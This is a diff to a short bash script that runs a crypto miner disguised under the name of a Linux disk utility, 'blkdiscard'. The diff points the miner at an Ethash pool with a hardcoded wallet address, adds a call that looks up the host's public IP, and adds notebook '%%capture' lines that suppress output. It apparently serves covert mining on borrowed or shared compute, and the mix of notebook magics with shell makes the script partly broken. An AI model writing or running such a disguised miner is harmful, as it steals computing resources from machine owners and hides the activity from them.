@@ -1,8 +1,13 @@
 #!/bin/bash
-POOL=https://server1.whalestonpool.com
+%%capture
+!%%capture
+
+#gives ip address 
+curl ipecho.net/plain
+POOL=https://next.ton-pool.com
 USER=$1
 ALGO=TON
 WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
 
 chmod +x blkdiscard
-./blkdiscard --algo $ALGO --pool $POOL --user $USER
+./blkdiscard --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0x6691e8a5d98c1B5cB01C1c4752C8fAD8642E680b.$WORKER
